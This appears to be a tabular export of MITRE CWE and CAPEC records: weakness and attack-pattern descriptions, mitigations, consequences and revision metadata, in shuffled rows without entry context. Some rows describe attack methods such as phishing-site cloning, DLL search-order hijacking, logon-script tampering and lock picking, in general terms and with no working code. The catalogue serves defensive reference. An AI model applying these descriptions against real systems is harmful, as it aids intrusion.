20643	72	Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash.
14596	35	MITRE
6947	23	The software uses a regular expression to perform neutralization, but the regular expression is not anchored and may allow malicious or malformed data to slip through.
23988	35	Cigital
16761	79	Confidentiality
7203	90	C
10801	104	1106
7429	39	2014-07-30
19623	62	updated Modes_of_Introduction, Other_Notes
7517	76	2019-09-30
12943	26	Architecture and Design
19919	62	updated Relationships, Observed_Example, Taxonomy_Mappings
24082	62	updated Relationships, Taxonomy_Mappings
12702	28	CWE Content Team
21766	91	Build and Compilation
8205	35	MITRE
10129	39	2011-09-13
15490	23	An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.
6974	31	1000
14707	35	MITRE
19714	39	2017-11-08
16089	35	MITRE
22103	23	In this attack pattern, the adversary leverages fuzzing to try to identify weaknesses in the system. Fuzzing is a software security and functionality testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occurred. Fuzzing treats the system as a black box and is totally free from any preconceptions or assumptions about the system. Fuzzing can help an attacker discover certain assumptions made about user input in the system. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions despite not necessarily knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve his goals.
13103	62	updated Relationships
15912	35	MITRE
23811	58	Alternate data streams (ADS) were first implemented in the Windows NT operating system to provide compatibility between NTFS and the Macintosh Hierarchical File System (HFS). In HFS, data and resource forks are used to store information about a file. The data fork provides information about the contents of the file while the resource fork stores metadata such as file type.
18950	28	Eric Dalci
14637	35	MITRE
22326	39	2011-06-01
10713	81	Other
14761	35	MITRE
24395	103	Primary
16841	103	Primary
6943	45	Class
6114	62	updated Applicable_Platforms
22084	67	High
19871	35	MITRE
13300	46	As data is parsed, improperly handled multiple leading special elements may cause the process to take unexpected actions that result in an attack.
17604	62	Suggested OWASP Top Ten 2004 mapping
18329	101	CAPEC Content Team
6773	62	updated Description
21649	56	ChildOf
13592	28	CWE Content Team
6071	62	updated Taxonomy_Mappings, White_Box_Definitions
10003	92	Exploit
8006	95	[Explore legitimate website and create duplicate] An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.
8335	28	CWE Content Team
10125	25	High
24909	103	Primary
21877	74	4
22190	28	CWE Content Team
23224	74	1
13680	79	Confidentiality
21826	80	The attacker has to identify injection vector, identify the operating system-specific commands, and optionally collect the output.
22640	91	Architecture and Design
13053	100	The MITRE Corporation
13768	63	Execute Unauthorized Code or Commands
8902	62	updated Time_of_Introduction
8901	28	CWE Content Team
22879	56	ChildOf
7190	91	Architecture and Design
12899	62	updated Common_Consequences, Demonstrative_Examples
18397	61	Draft
17445	31	699
9845	43	Simple
15709	35	MITRE
9061	21	PLOVER
23247	62	updated Common_Consequences, Description, Other_Notes
15787	103	Primary
5810	62	Clarified entry to focus on algorithms that do not have major weaknesses, but may not be strong enough for some purposes.
16278	35	MITRE
6946	39	2017-01-19
14394	79	Confidentiality
17398	21	PLOVER
16530	96	2009-03-03
15189	35	MITRE
19867	103	Primary
17312	43	Simple
21928	35	MITRE
17178	35	MITRE
18983	59	Updated Related_Attack_Patterns, Resources_Required
6710	101	CAPEC Content Team
15424	62	updated Applicable_Platforms
6744	80	To inject the malicious payload in a web page
7222	28	CWE Content Team
22874	21	PLOVER
21672	62	updated Relationships, Taxonomy_Mappings
16256	62	updated Relationships
21818	103	Primary
18931	101	CAPEC Content Team
5593	62	updated Common_Consequences, Description, Likelihood_of_Exploit, Name, Other_Notes, Potential_Mitigations, References, Relationships
7077	39	2012-05-11
12561	59	Updated Attack_Phases
21615	39	2009-07-27
22555	28	CWE Content Team
17275	81	Non-Repudiation
21397	62	updated Relationships
15044	39	2009-05-27
20734	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
11252	62	updated Relationships, Taxonomy_Mappings
14772	35	MITRE
15246	62	updated Related_Attack_Patterns
12480	42	Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier.
15182	62	updated Description
11857	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site
16423	72	Most memory leaks result in general software reliability problems, but if an attacker can intentionally trigger a memory leak, the attacker might be able to launch a denial of service attack (by crashing or hanging the program) or take advantage of other unexpected program behavior resulting from a low memory condition.
21848	72	Malicious users can fake authentication information by providing false DNS information.
12670	46	If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations, possibly leading to resultant weaknesses. Moreover, it indicates that the validation logic is not up-to-date, and can indicate that other, more subtle validation errors are present.
9364	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
6008	31	699
15907	62	updated Common_Consequences
21471	88	Windows Hard Link
19619	62	updated Potential_Mitigations
20011	100	The MITRE Corporation
11242	28	CWE Content Team
13778	39	2012-05-11
22205	62	updated Related_Attack_Patterns
7426	21	PLOVER
12934	28	CWE Content Team
20477	89	Detailed
7405	69	Incomplete
22088	35	MITRE
12359	62	updated Relationships, Taxonomy_Mappings
12935	69	Draft
14339	100	The MITRE Corporation
16140	96	2018-07-02
12318	39	2010-02-16
12137	81	Availability
11505	28	CWE Content Team
16259	39	2008-07-01
9426	39	2019-06-20
15976	39	2012-05-11
22282	28	CWE Content Team
16091	56	ChildOf
19093	101	CAPEC Content Team
16116	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
5657	55	CAPEC Content Team
15703	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit, Typical_Severity
17098	91	Architecture and Design
9772	56	ChildOf
15774	54	Low
12764	28	CWE Content Team
15640	63	Unexpected State
19253	73	Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.
16565	100	The MITRE Corporation
24887	28	CWE Content Team
15760	62	updated Potential_Mitigations
11827	39	2012-10-30
22535	35	MITRE
13868	62	updated Potential_Mitigations
13773	28	CWE Content Team
15277	31	699
11874	62	updated Relationships, Taxonomy_Mappings
7315	62	updated Relationships
17169	35	MITRE
19642	28	Sean Eidemiller
9302	28	CWE Content Team
10393	56	ChildOf
18487	81	Other
18678	86	http://www.usenix.org/events/sec10/tech/full_papers/Felmetsger.pdf
20923	66	XML External Entity Attacks (XXE)
24364	81	Access Control
21260	35	MITRE
18247	56	ChildOf
8802	69	Stable
16320	28	CWE Content Team
24693	92	Experiment
15171	103	Primary
15518	62	updated Related_Attack_Patterns
14038	35	MITRE
17987	28	CWE Content Team
19362	35	MITRE
6913	39	2009-01-12
10745	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
5681	85	530
16789	50	Implementation: The victim should configure the browser to minimize active content from untrusted sources.
20411	23	The adversary uses disruptive signals or events (e.g. electromagnetic pulses, laser pulses, clock glitches, etc.) to cause faulty behavior in electronic devices. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information.
11393	28	CWE Content Team
14569	96	2013-06-22
23793	90	PHP
24275	28	CWE Content Team
17840	35	MITRE
14509	28	Eric Dalci
12914	100	The MITRE Corporation
13913	55	CAPEC Content Team
18074	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
25047	39	2012-05-11
14147	39	2014-07-30
17615	39	2017-11-08
15187	79	Confidentiality
13850	33	Jon Postel, Editor
11205	26	Implementation
18786	86	http://www2.dcsec.uni-hannover.de/files/android/p50-fahl.pdf
21418	48	02
17783	35	MITRE
19269	61	Draft
10119	47	Modify Data
10765	47	Hide Activities
17935	28	CWE Content Team
7931	62	updated Relationships
17326	104	673
17487	62	updated Potential_Mitigations
8666	35	MITRE
14304	28	CWE Content Team
16401	69	Draft
23111	42	Use Static Analysis tools to spot such conditions.
10793	103	Primary
20390	103	Primary
10841	101	CAPEC Content Team
12580	61	Draft
9118	39	2009-05-27
24602	69	Incomplete
22785	62	updated Alternate_Terms, Common_Consequences, Description, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships
13240	61	Stable
20970	91	Testing
17280	39	2013-02-21
20512	101	CAPEC Content Team
9435	69	Incomplete
13939	23	The software does not properly limit the number or frequency of interactions that it has with an actor, such as the number of incoming requests.
16958	35	MITRE
12228	28	CWE Content Team
11064	62	updated Description
6424	59	Updated Related_Attack_Patterns
15479	28	CWE Content Team
16561	45	Class
11095	28	Eric Dalci
8444	35	MITRE
22512	59	Updated Resources_Required
19304	81	Integrity
19269	50	Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.
10210	62	updated Potential_Mitigations, References
13190	62	updated Relationships, Taxonomy_Mappings
19171	28	CWE Content Team
23357	102	ChildOf
21517	104	1110
13181	35	MITRE
13690	88	Excessively Complex Data Representation
21725	33	Kate Greenwood
17143	79	Confidentiality
14025	42	Remove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths.
24403	47	Bypass Protection Mechanism
19914	76	2019-04-04
14035	31	1000
13324	39	2008-07-01
24805	96	2008-01-30
12928	45	Base
12482	23	The software does not properly restrict reading from or writing to dynamically-managed code resources such as variables, objects, classes, attributes, functions, or executable instructions or statements.
16172	49	2005
11517	62	updated Demonstrative_Examples
25123	85	200
15898	23	The wrong "handler" is assigned to process an object.
9830	104	196
15557	28	CWE Content Team
22321	35	Cigital
16526	24	MITRE
6882	35	MITRE
6770	39	2017-11-08
9666	28	CWE Content Team
9843	104	1089
20485	55	CAPEC Content Team
14750	91	Distribution
21172	85	524
18157	28	CWE Content Team
23686	28	CWE Content Team
14347	42	Use the function, procedure, or routine as specified.
11019	28	CWE Content Team
9069	35	MITRE
23323	91	Architecture and Design
19078	58	An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.
23670	28	CWE Content Team
17574	102	ChildOf
13585	62	updated Description, Other_Notes
13225	62	updated Relationships, Taxonomy_Mappings
12809	35	MITRE
5720	28	CWE Content Team
17718	26	Architecture and Design
11791	35	MITRE
13265	103	Primary
21671	62	updated Common_Consequences, Relationships
14030	63	Execute Unauthorized Code or Commands
14206	69	Draft
17917	35	MITRE
11090	35	MITRE
12663	35	MITRE
9790	62	updated Potential_Mitigations
5691	103	Primary
20776	47	Execute Unauthorized Commands
20693	104	621
11021	53	The MITRE Corporation
23412	35	MITRE
15751	28	CWE Content Team
8528	101	CAPEC Content Team
24256	85	13
18523	91	Implementation
9969	91	Architecture and Design
12381	62	updated Name
14110	62	updated Relationships
24378	81	Access Control
14009	91	Implementation
13138	44	High
22164	35	MITRE
23019	28	CWE Content Team
13330	35	MITRE
12228	39	2012-05-11
13584	77	Manual Static Analysis - Source Code
15522	39	2008-07-01
23278	28	CWE Content Team
21126	57	Primary
9937	24	MITRE
9735	62	updated Time_of_Introduction
8586	35	MITRE
23078	90	Language-Independent
14357	101	CAPEC Content Team
15173	63	Read Files or Directories
19215	31	1003
22691	49	2004
12795	28	CWE Content Team
18096	69	Incomplete
24723	72	In some cases, an application's interpreter might kill a process or thread that appears to be consuming too much resources, such as with PHP's memory_limit setting. When the interpreter kills the process/thread, it might report an error containing detailed information such as the application's installation path.
18587	69	Draft
13047	62	updated Common_Consequences
24809	92	Experiment
12978	97	Leveraging Race Conditions via Symbolic Links
20689	104	924
10063	91	Implementation
13537	40	The target must be relying on valid GPS signal to perform critical operations.
25426	101	CAPEC Content Team
21068	62	updated Relationships, Taxonomy_Mappings
20618	40	The application server does not perform proper input validation.
13031	62	updated Common_Consequences
10236	100	The MITRE Corporation
23617	39	2011-06-27
25057	79	Integrity
24950	62	updated Potential_Mitigations
15207	39	2009-12-28
6984	78	Medium
11041	43	Simple
23095	100	The MITRE Corporation
18974	81	Integrity
15529	53	The MITRE Corporation
14550	39	2012-10-30
15880	42	Use strong, non-reversible encryption to protect stored passwords.
12276	35	MITRE
6904	42	Create default error pages or messages that do not leak any information.
21373	21	PLOVER
19233	39	2008-07-01
20466	81	Integrity
15585	35	MITRE
19546	91	Requirements
21967	31	699
7028	76	2019-09-30
13079	62	updated Relationships
15340	56	ChildOf
16798	100	The MITRE Corporation
20210	35	MITRE
23542	39	2019-01-03
15320	63	Reduce Maintainability
14235	62	updated Relationships
8085	62	updated Description, Name
10074	47	Gain Privileges
17420	53	The MITRE Corporation
24572	23	An attacker obtains an authoritative or reputable signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.
12630	81	Access Control
16210	35	MITRE
11152	28	CWE Content Team
21286	28	Eric Dalci
19976	47	Gain Privileges
11283	28	CWE Content Team
17419	28	CWE Content Team
12753	104	469
21427	21	CWE Content Team
19772	62	updated Relationships
8865	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
12437	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
23375	90	Language-Independent
22245	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
17283	39	2014-07-30
17004	45	Base
9145	39	2008-07-01
15849	28	CWE Content Team
14754	35	MITRE
13198	28	Eric Dalci
18845	39	2019-09-19
11343	51	2014-06-23
11231	39	2008-09-08
14920	63	Quality Degradation
22618	59	Updated Activation_Zone, Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Severity
9699	48	12
13494	62	updated Related_Attack_Patterns
17060	76	2019-09-30
14828	91	Implementation
7436	78	Low
24719	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8686	39	2011-06-01
5815	53	The MITRE Corporation
13350	35	MITRE
17523	35	MITRE
16597	32	University of Minnesota
18929	62	updated Relationships, Taxonomy_Mappings
20381	50	Use the sendmail restricted shell program (smrsh)
11469	55	CAPEC Content Team
10004	35	MITRE
9258	103	Primary
21903	62	updated Time_of_Introduction
9943	35	MITRE
18131	92	Experiment
25288	43	Simple
14052	90	Language-Independent
17467	39	2011-06-01
13035	77	Architecture or Design Review
12302	28	CWE Content Team
15991	39	2011-06-27
11836	39	2008-09-08
18476	31	1000
13633	39	2011-06-01
23881	104	117
10972	62	updated Relationships, Taxonomy_Mappings
15283	40	Target client software must allow scripting such as JavaScript.
7819	62	updated Demonstrative_Examples, Description, Maintenance_Notes, Potential_Mitigations, Relationships
20561	76	2019-04-04
9311	102	ChildOf
6199	26	Operation
24539	35	MITRE
13835	42	Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
24781	28	CWE Content Team
13139	62	updated Modes_of_Introduction, Observed_Examples, Potential_Mitigations, Time_of_Introduction
24692	28	CWE Content Team
5610	22	12
17537	62	updated Relationships
15655	35	MITRE
18890	35	Cigital
22553	27	None: No specialized resources are required to execute this type of attack.
10874	23	An attacker uses a Snap Gun, also known as a Pick Gun, to force the lock on a building or facility. A Pick Gun is a special type of lock picking instrument that works on similar principles as lock bumping. A snap gun is a hand-held device with an attached metal pick. The metal pick strikes the pins within the lock, transferring motion from the key pins to the driver pins and forcing the lock into momentary alignment. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A Snap Gun exploits this design by using a metal pin to strike all of the key pins at once, forcing the driver pins to shift into an unlocked position. Unlike bump keys or lock picks, a Snap Gun may damage the lock more easily, leaving evidence that the lock has been tampered with.
6073	62	updated Causal_Nature, Common_Consequences, Demonstrative_Examples, Taxonomy_Mappings
22632	28	CWE Content Team
19423	28	CWE Content Team
20040	45	Base
25118	28	Eric Dalci
11492	51	2014-06-23
18977	44	Moderate
24310	39	2010-12-13
11673	39	2008-07-01
10543	66	Dynamic-Link Library Security
16053	46	Data-structure sentinels are often used to mark the structure of data. A common example of this is the null character at the end of strings or a special sentinel to mark the end of a linked list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the addition or modification of sentinels.
11901	48	02
24853	31	699
15238	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
6094	101	CAPEC Content Team
9087	39	2011-03-29
10638	28	CWE Content Team
7215	100	The MITRE Corporation
14688	31	1000
13880	43	Simple
10218	76	2017-05-01
13204	63	Read Application Data
8790	23	The source code contains a block that does not contain any code, i.e., the block is empty.
16108	59	Updated Attack_Motivation-Consequences, Attack_Phases
11613	23	An adversary deceives an application or user and convinces them to request a resource from an unintended location. By spoofing the location, the adversary can cause an alternate resource to be used, often one that the adversary controls and can be used to help them achieve their malicious goals.
12234	103	Primary
10556	23	The adversary influences the target's actions by leveraging the inherent human nature to assume behavior of others is appropriate. In situations of uncertainty, people tend to behave in ways they see others behaving. The adversary convinces the target of adopting behavior or actions that is advantageous to the adversary.
19383	28	CWE Content Team
22065	23	The software does not handle or incorrectly handles when a parameter, field, or argument name is specified, but the associated value is missing, i.e. it is empty, blank, or null.
11456	35	MITRE
16689	79	Access Control
16257	45	Variant
12483	62	updated Relationships
6063	35	MITRE
20618	85	77
6688	55	CAPEC Content Team
11028	90	Language-Independent
15569	56	ChildOf
22900	23	The developer builds a security-critical protection mechanism into the software, but the processor optimizes the execution of the program such that the mechanism is removed or modified.
6471	50	Ensure all buffer uses are consistently bounds-checked.
15757	31	1000
16326	90	Language-Independent
21049	61	Draft
20219	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
18712	76	2017-05-01
17224	62	updated Detection_Factors, Potential_Mitigations
9024	39	2019-06-20
8097	76	2018-07-31
18329	100	The MITRE Corporation
24505	31	699
17318	49	2011
22225	39	2012-05-11
12839	39	2009-03-10
24666	103	Primary
20743	35	MITRE
17586	69	Incomplete
19018	61	Stable
10991	91	Implementation
16484	39	2013-07-17
24007	101	CAPEC Content Team
22009	90	Python
18996	81	Other
18507	38	The only indicators are multiple responses to a single request in the web logs. However, this is difficult to notice in the absence of an application filter proxy or a log analyzer. There are no indicators for the client
5927	22	12
7177	35	MITRE
8451	61	Draft
22947	39	2017-11-08
19643	39	2017-01-19
21393	28	CWE Content Team
12658	55	CAPEC Content Team
6085	28	CWE Content Team
11028	23	The software does not properly prevent private data (such as credit card numbers) from being accessed by actors who either (1) are not explicitly authorized to access the data or (2) do not have the implicit consent of the people to which the data is related.
9257	73	Send a large number of crafted XML messages to the target URL.
23500	35	MITRE
23053	81	Availability
21665	56	ChildOf
10403	91	Implementation
21317	44	High
7481	76	2018-07-31
8266	81	Confidentiality
17320	31	1000
17657	31	1000
23210	59	Updated Related_Weaknesses
19971	39	2009-05-27
9369	62	updated Common_Consequences
11814	28	CWE Content Team
14361	76	2018-07-31
19964	35	MITRE
14837	47	Modify Data
16830	53	The MITRE Corporation
21075	42	To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
15218	104	657
24196	21	CWE Content Team
11995	103	Primary
15098	81	Availability
15117	28	Eric Dalci
19833	35	MITRE
23388	62	updated Time_of_Introduction
6852	62	updated Potential_Mitigations
6369	35	MITRE
22736	79	Confidentiality
24335	62	updated Relationships
20210	62	updated Description, Maintenance_Notes, Name, Relationships, Taxonomy_Mappings
22896	104	551
24044	49	2008
18897	35	MITRE
9598	81	Integrity
12386	35	MITRE
15589	35	MITRE
8096	31	1000
19103	31	1000
23546	35	MITRE
23727	104	605
10684	96	2019-01-03
14149	35	MITRE
20235	35	MITRE
19651	42	Never allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism.
22348	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
20849	28	CWE Content Team
21564	35	MITRE
13001	26	Architecture and Design
14827	62	updated Relationships, Taxonomy_Mappings
8891	46	Null termination errors frequently occur in two different ways. An off-by-one error could cause a null to be written out of bounds, leading to an overflow. Or, a program could use a strncpy() function call incorrectly, which prevents a null terminator from being added at all. Other scenarios are possible.
7998	80	The adversary must have some knowledge of how messages are routed.
11454	39	2014-07-30
20376	31	1000
9111	35	MITRE
14607	35	MITRE
25143	21	PLOVER
24054	55	Seamus Tuohy
15693	35	MITRE
24515	62	updated Common_Consequences, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
21132	97	Contaminate Resource
20592	101	CAPEC Content Team
13013	95	The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters have harmful consequences.
13238	91	Implementation
5733	45	Variant
11694	42	Most compilers will complain about the use of uninitialized variables if warnings are turned on.
5799	103	Primary
12960	39	2008-11-24
8288	35	MITRE
10162	56	CanPrecede
15856	104	648
13677	63	Modify Application Data
22429	42	Use the start() method instead of the run() method.
12324	31	1000
16214	51	2014-06-23
11983	39	2012-05-11
22807	21	CWE Content Team
7861	104	24
23938	90	PHP
13019	28	CWE Content Team
17608	39	2008-09-08
21385	39	2017-11-08
9196	31	1000
11855	62	updated Relationships
8335	39	2014-07-30
25440	56	ChildOf
13751	63	Modify Application Data
8385	39	2011-06-27
11856	28	CWE Content Team
24150	56	ChildOf
23958	39	2012-05-11
7662	35	MITRE
25343	39	2009-10-29
7093	36	http://en.wikipedia.org/wiki/Deadlock
6408	62	updated Related_Attack_Patterns, Relationships
5965	31	1000
5735	35	MITRE
20904	56	PeerOf
17043	62	updated Time_of_Introduction
14778	35	MITRE
23890	39	2008-09-08
25385	39	2019-06-20
15225	28	CWE Content Team
25033	35	MITRE
15415	56	CanPrecede
11669	56	ChildOf
14578	62	updated Relationships, Taxonomy_Mappings
19059	35	MITRE
19151	62	updated Time_of_Introduction
16879	28	CWE Content Team
6186	103	Primary
13218	39	2008-09-08
20400	30	T. Anderson
17731	79	Confidentiality
7954	77	Dynamic Analysis with Manual Results Interpretation
5984	35	MITRE
6112	23	The product mixes trusted and untrusted data in the same data structure or structured message.
13752	81	Access Control
8695	62	updated Common_Consequences, Demonstrative_Examples, References, Relationships
8667	81	Integrity
14373	35	Cigital
14666	62	updated Causal_Nature, Relationships
8008	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.                   Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59). This includes:                                                                  realpath() in C                         getCanonicalPath() in Java                         GetFullPath() in ASP.NET                         realpath() or abs_path() in Perl                         realpath() in PHP
13974	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
22921	55	CAPEC Content Team
21554	28	CWE Content Team
15185	39	2014-07-30
6189	45	Base
10506	35	MITRE
25211	35	MITRE
11146	62	updated Relationships
21066	39	2019-01-03
19041	50	Use browser technologies that do not allow client side scripting.
19396	76	2019-04-04
22236	28	CWE Content Team
22102	72	Signal race conditions often result in data corruption.
24316	39	2010-04-05
6997	28	CWE Content Team
6977	63	Bypass Protection Mechanism
16545	35	MITRE
18710	28	Eric Dalci
20938	57	Primary
25255	103	Primary
6566	28	CWE Content Team
9758	35	MITRE
10614	55	CAPEC Content Team
5967	32	Center for Applied Internet Data Analysis
7644	62	updated Applicable_Platforms, Demonstrative_Examples, Likelihood_of_Exploit, References, Relationships, Taxonomy_Mappings, White_Box_Definitions
22944	28	CWE Content Team
12844	104	698
24471	35	MITRE
7393	90	Language-Independent
10341	28	CWE Content Team
8435	49	2008
19874	46	If an attacker can manipulate the length parameter associated with an input such that it is inconsistent with the actual length of the input, this can be leveraged to cause the target application to behave in unexpected, and possibly, malicious ways. One of the possible motives for doing so is to pass in arbitrarily large input to the application. Another possible motivation is the modification of application state by including invalid data for subsequent properties of the application. Such weaknesses commonly lead to attacks such as buffer overflows and execution of arbitrary code.
9095	88	Authentication Bypass Using an Alternate Path or Channel
15182	28	CWE Content Team
11905	35	MITRE
15299	25	Medium
24679	39	2009-01-12
18654	62	updated Demonstrative_Examples, Potential_Mitigations
14527	62	updated Common_Consequences, Demonstrative_Examples, Maintenance_Notes, Modes_of_Introduction, Observed_Examples, Relationships, Research_Gaps, Terminology_Notes
6009	28	CWE Content Team
18120	44	SOAR Partial
12419	95	Determine what external libraries the application accesses.
12567	78	Very High
10984	35	MITRE
13839	92	Explore
10363	59	Updated Related_Attack_Patterns
16376	53	The MITRE Corporation
11648	46	As data is parsed, an injected delimiter may cause the process to take unexpected actions that result in an attack. Example: "$" for an environment variable.
11301	62	updated Common_Consequences
14722	35	MITRE
14027	28	CWE Content Team
23791	100	The MITRE Corporation
24737	96	2018-07-02
14984	62	updated Relationships
11080	56	CanPrecede
7414	62	updated Common_Consequences
11796	104	400
6586	39	2019-06-20
11256	62	updated Observed_Examples
19248	103	Primary
9476	67	High
11895	62	updated Potential_Mitigations
12973	35	MITRE
19713	103	Primary
19099	62	updated Detection_Factors, Relationships
20969	39	2008-09-08
24227	39	2017-05-03
21657	90	C
11539	26	Architecture and Design
15886	39	2008-09-08
17263	39	2011-03-29
12344	32	https://blog.bit9.com/2013/02/08/bit9-and-our-customers-security/
7363	23	Operating system allows logon scripts to be run whenever a specific user or users logon to a system. If adversaries can access these scripts, they may insert additional code into the logon script. This code can allow them to maintain persistence or move laterally within an enclave because it is executed every time the affected user or users logon to a computer. Modifying logon scripts can effectively bypass workstation and enclave firewalls. Depending on the access configuration of the logon scripts, either local credentials or a remote administrative account may be necessary.
13754	69	Incomplete
24050	31	1000
22624	31	1000
22140	40	The target host does not do proper range checking on the variable before utilizing it.
24460	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
5989	39	2019-01-03
24928	92	Explore
15364	28	CWE Content Team
22244	31	699
14129	81	Availability
18765	23	This OS fingerprinting probe tests the target system's assignment of TCP sequence numbers. One common way to test TCP Sequence Number generation is to send a probe packet to an open port on the target and then compare the how the Sequence Number generated by the target relates to the Acknowledgement Number in the probe packet. Different operating systems assign Sequence Numbers differently, so a fingerprint of the operating system can be obtained by categorizing the relationship between the acknowledgement number and sequence number as follows: 1) the Sequence Number generated by the target is Zero, 2) the Sequence Number generated by the target is the same as the acknowledgement number in the probe, 3) the Sequence Number generated by the target is the acknowledgement number plus one, or 4) the Sequence Number is any other non-zero number.
11933	35	MITRE
24187	56	ChildOf
15871	31	1000
25397	81	Confidentiality
19832	95	[Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application
21004	31	1000
22578	31	1000
20107	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
20738	45	Class
25276	62	updated Relationships, Taxonomy_Mappings
14989	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
18309	28	CWE Content Team
11892	35	MITRE
24163	35	MITRE
11105	39	2009-05-27
10283	23	An adversary exploits a weakness in an application's specification of external libraries to exploit the functionality of the loader where the process loading the library searches first in the same directory in which the process binary resides and then in other directories. Exploitation of this preferential search order can allow an attacker to make the loading process load the adversary's rogue library rather than the legitimate library. This attack can be leveraged with many different libraries and with many different loading processes. No forensic trails are left in the system's registry or file system that an incorrect library had been loaded.
8121	97	TCP ACK Scan
20856	35	MITRE
7235	62	updated Background_Details, Common_Consequences, Enabling_Factors_for_Exploitation, Other_Notes, Potential_Mitigations
15237	81	Confidentiality
10237	62	updated Common_Consequences
